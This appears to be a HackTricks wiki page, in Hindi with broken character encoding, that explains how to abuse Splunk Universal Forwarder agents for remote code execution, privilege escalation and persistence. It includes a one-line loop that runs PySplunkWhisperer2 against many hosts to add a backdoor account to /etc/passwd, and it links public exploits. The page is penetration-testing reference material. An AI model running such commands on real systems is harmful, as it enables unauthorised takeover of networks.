# Splunk LPE ‡§î‡§∞ ‡§∏‡•ç‡§•‡§ø‡§∞‡§§‡§æ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

‡§Ø‡§¶‡§ø **‡§Ü‡§Ç‡§§‡§∞‡§ø‡§ï** ‡§Ø‡§æ **‡§¨‡§æ‡§π‡§∞‡•Ä** ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§Æ‡§∂‡•Ä‡§® ‡§ï‡§æ **‡§ó‡§£‡§®‡§æ** ‡§ï‡§∞‡§§‡•á ‡§∏‡§Æ‡§Ø ‡§Ü‡§™‡§ï‡•ã **Splunk ‡§ö‡§≤‡§æ‡§§‡•á ‡§π‡•Å‡§è** (‡§™‡•ã‡§∞‡•ç‡§ü 8090) ‡§Æ‡§ø‡§≤‡§§‡§æ ‡§π‡•à, ‡§Ø‡§¶‡§ø ‡§Ü‡§™‡§ï‡•ã ‡§ï‡§ø‡§∏‡•Ä **‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤** ‡§ï‡§æ ‡§™‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ü‡§™ **Splunk ‡§∏‡•á‡§µ‡§æ ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó** ‡§ï‡§∞‡§ï‡•á **‡§è‡§ï ‡§∂‡•á‡§≤** ‡§ï‡•ã ‡§â‡§∏ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç **‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡•ã Splunk ‡§ö‡§≤‡§æ ‡§∞‡§π‡§æ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§∞‡•Ç‡§ü ‡§á‡§∏‡•á ‡§ö‡§≤‡§æ ‡§∞‡§π‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ü‡§™ ‡§∞‡•Ç‡§ü ‡§§‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§¨‡§¢‡§º‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§Ø‡§¶‡§ø ‡§Ü‡§™ **‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§π‡•Ä ‡§∞‡•Ç‡§ü ‡§π‡•à‡§Ç ‡§î‡§∞ Splunk ‡§∏‡•á‡§µ‡§æ ‡§ï‡•á‡§µ‡§≤ ‡§≤‡•ã‡§ï‡§≤‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ ‡§∏‡•Å‡§® ‡§®‡§π‡•Ä‡§Ç ‡§∞‡§π‡•Ä ‡§π‡•à**, ‡§§‡•ã ‡§Ü‡§™ **Splunk ‡§∏‡•á‡§µ‡§æ ‡§∏‡•á** **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** ‡§´‡§º‡§æ‡§á‡§≤ **‡§ö‡•Å‡§∞‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** ‡§ï‡•ã **‡§ï‡•ç‡§∞‡•à‡§ï** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§Ø‡§æ ‡§á‡§∏‡§Æ‡•á‡§Ç **‡§®‡§è** ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤ **‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§î‡§∞ ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ ‡§∏‡•ç‡§•‡§ø‡§∞‡§§‡§æ ‡§¨‡§®‡§æ‡§è ‡§∞‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§®‡•Ä‡§ö‡•á ‡§™‡§π‡§≤‡•á ‡§ö‡§ø‡§§‡•ç‡§∞ ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ï‡§ø ‡§è‡§ï Splunkd ‡§µ‡•á‡§¨ ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•à‡§∏‡§æ ‡§¶‡§ø‡§ñ‡§§‡§æ ‡§π‡•à‡•§

## Splunk ‡§Ø‡•Ç‡§®‡§ø‡§µ‡§∞‡•ç‡§∏‡§≤ ‡§´‡•â‡§∞‡§µ‡§∞‡•ç‡§°‡§∞ ‡§è‡§ú‡•á‡§Ç‡§ü ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§∏‡§æ‡§∞‡§æ‡§Ç‡§∂

‡§Ö‡§ß‡§ø‡§ï ‡§µ‡§ø‡§µ‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ã‡§∏‡•ç‡§ü ‡§¶‡•á‡§ñ‡•á‡§Ç [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)‡•§ ‡§Ø‡§π ‡§ï‡•á‡§µ‡§≤ ‡§è‡§ï ‡§∏‡§æ‡§∞‡§æ‡§Ç‡§∂ ‡§π‡•à:

**‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§Ö‡§µ‡§≤‡•ã‡§ï‡§®:**
Splunk ‡§Ø‡•Ç‡§®‡§ø‡§µ‡§∞‡•ç‡§∏‡§≤ ‡§´‡•â‡§∞‡§µ‡§∞‡•ç‡§°‡§∞ ‡§è‡§ú‡•á‡§Ç‡§ü (UF) ‡§ï‡•ã ‡§≤‡§ï‡•ç‡§∑‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§è‡§ï ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§â‡§® ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞‡•ã‡§Ç ‡§ï‡•ã ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§®‡§ï‡•á ‡§™‡§æ‡§∏ ‡§è‡§ú‡•á‡§Ç‡§ü ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§π‡•à, ‡§è‡§ú‡•á‡§Ç‡§ü ‡§ö‡§≤‡§æ ‡§∞‡§π‡•á ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§™‡§∞ ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§™‡•Ç‡§∞‡•á ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§ï‡•ã ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

**‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§¨‡§ø‡§Ç‡§¶‡•Å:**
- UF ‡§è‡§ú‡•á‡§Ç‡§ü ‡§Ü‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§®‡•ã‡§Ç ‡§Ø‡§æ ‡§ï‡•ã‡§° ‡§ï‡•Ä ‡§™‡•ç‡§∞‡§æ‡§Æ‡§æ‡§£‡§ø‡§ï‡§§‡§æ ‡§ï‡•ã ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§ú‡§ø‡§∏‡§∏‡•á ‡§Ø‡§π ‡§Ö‡§®‡§ß‡§ø‡§ï‡•É‡§§ ‡§ï‡•ã‡§° ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§π‡•ã ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
- ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§Ö‡§ß‡§ø‡§ó‡•ç‡§∞‡§π‡§£ ‡§µ‡§ø‡§ß‡§ø‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§®‡§ø‡§∞‡•ç‡§¶‡•á‡§∂‡§ø‡§ï‡§æ‡§ì‡§Ç, ‡§´‡§º‡§æ‡§á‡§≤ ‡§∂‡•á‡§Ø‡§∞‡•ã‡§Ç, ‡§Ø‡§æ ‡§Ü‡§Ç‡§§‡§∞‡§ø‡§ï ‡§¶‡§∏‡•ç‡§§‡§æ‡§µ‡•á‡§ú‡§º‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§¢‡•Ç‡§Ç‡§¢‡§®‡§æ ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡•§
- ‡§∏‡§´‡§≤ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§∏‡•á ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ SYSTEM ‡§Ø‡§æ ‡§∞‡•Ç‡§ü ‡§∏‡•ç‡§§‡§∞ ‡§ï‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö, ‡§°‡•á‡§ü‡§æ ‡§®‡§ø‡§ï‡§æ‡§∏‡•Ä, ‡§î‡§∞ ‡§Ü‡§ó‡•á ‡§ï‡•á ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§Æ‡•á‡§Ç ‡§ò‡•Å‡§∏‡§™‡•à‡§† ‡§π‡•ã ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

**‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§®:**
1. ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ UF ‡§è‡§ú‡•á‡§Ç‡§ü ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§
2. ‡§è‡§ú‡•á‡§Ç‡§ü‡•ã‡§Ç ‡§ï‡•ã ‡§Ü‡§¶‡•á‡§∂ ‡§Ø‡§æ ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è Splunk API ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§
3. ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§Æ‡•á‡§Ç ‡§´‡§º‡§æ‡§á‡§≤ ‡§®‡§ø‡§∑‡•ç‡§ï‡§∞‡•ç‡§∑‡§£, ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ñ‡§æ‡§§‡§æ ‡§π‡•á‡§∞‡§´‡•á‡§∞, ‡§î‡§∞ ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•à‡§Ç‡•§

**‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:**
- ‡§™‡•ç‡§∞‡§§‡•ç‡§Ø‡•á‡§ï ‡§π‡•ã‡§∏‡•ç‡§ü ‡§™‡§∞ SYSTEM/‡§∞‡•Ç‡§ü ‡§∏‡•ç‡§§‡§∞ ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ‡•§
- ‡§™‡§π‡§ö‡§æ‡§® ‡§∏‡•á ‡§¨‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡•â‡§ó‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§Ö‡§ï‡•ç‡§∑‡§Æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ‡•§
- ‡§¨‡•à‡§ï‡§°‡•ã‡§∞ ‡§Ø‡§æ ‡§∞‡•à‡§®‡§∏‡§Æ‡§µ‡•á‡§Ø‡§∞ ‡§ï‡•Ä ‡§∏‡•ç‡§•‡§æ‡§™‡§®‡§æ‡•§

**‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Ü‡§¶‡•á‡§∂:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**‡§â‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§∏‡§æ‡§∞‡•ç‡§µ‡§ú‡§®‡§ø‡§ï ‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•â‡§á‡§ü‡•ç‡§∏:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Splunk ‡§ï‡•ç‡§µ‡•á‡§∞‡•Ä‡§ú‡§º ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó

**‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ã‡§∏‡•ç‡§ü ‡§¶‡•á‡§ñ‡•á‡§Ç [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
